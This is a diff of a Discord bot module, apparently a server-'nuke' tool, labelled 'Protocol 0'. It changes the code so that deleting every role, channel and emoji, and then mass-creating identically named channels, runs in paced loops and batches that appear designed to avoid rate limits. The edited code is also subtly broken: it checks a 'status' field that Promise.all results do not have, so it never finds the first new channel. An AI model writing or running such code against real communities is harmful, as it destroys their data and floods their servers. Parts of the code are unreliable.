@@ -133,34 +133,49 @@ module.exports = {
         const roles = guild.roles.cache.filter(r => r.editable && r.id !== guild.id);
         const emojis = guild.emojis.cache;
 
-        // --- DELETE OPERATIONS ---
+        // --- DELETE OPERATIONS (STAGGERED) ---
+        const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-        // 1. Roles (Parallel)
-        roles.forEach(r => r.delete().catch(() => { }));
+        // 1. Roles (Sequential Stagger)
+        for (const r of roles.values()) {
+          await r.delete().catch(() => { });
+          await wait(300);
+        }
 
-        // 2. Channels (Parallel - Including current)
-        channels.forEach(c => c.delete().catch(() => { }));
+        // 2. Channels (Sequential Stagger)
+        for (const c of channels.values()) {
+          await c.delete().catch(() => { });
+          await wait(300);
+        }
 
-        // 3. Emojis (Parallel)
-        emojis.forEach(e => e.delete().catch(() => { }));
+        // 3. Emojis (Sequential Stagger)
+        for (const e of emojis.values()) {
+          await e.delete().catch(() => { });
+          await wait(100);
+        }
 
         if (rebuild) {
           // Immediately start rebuilding without waiting for deletions to finish
           // This is "Fast as F**k" mode
 
-          const channelTasks = [];
-          for (let i = 0; i < params.count; i++) {
-            channelTasks.push(
-              guild.channels.create({
-                name: params.name,
-                type: ChannelType.GuildText,
-                reason: "Protocol 0: Rebuild"
-              }).catch(() => { })
-            );
+          // HYPER-PULSE REBUILDING (Batch Processing)
+          const results = [];
+          const batchSize = 10;
+          for (let i = 0; i < params.count; i += batchSize) {
+            const batch = [];
+            for (let j = 0; j < batchSize && (i + j) < params.count; j++) {
+              batch.push(
+                guild.channels.create({
+                  name: params.name,
+                  type: ChannelType.GuildText,
+                  reason: "Protocol 0: Rebuild"
+                }).catch(() => { })
+              );
+            }
+            const batchResults = await Promise.all(batch);
+            results.push(...batchResults);
+            await wait(150); // Small gap between batches to breathe
           }
-          // We don't await this because the current channel is likely deleting, so we can't report back easily.
-          // Just fire and forget.
-          const results = await Promise.allSettled(channelTasks);
 
           // Find first successfully created channel
           const firstChannel = results.find(r => r.status === "fulfilled")?.value;
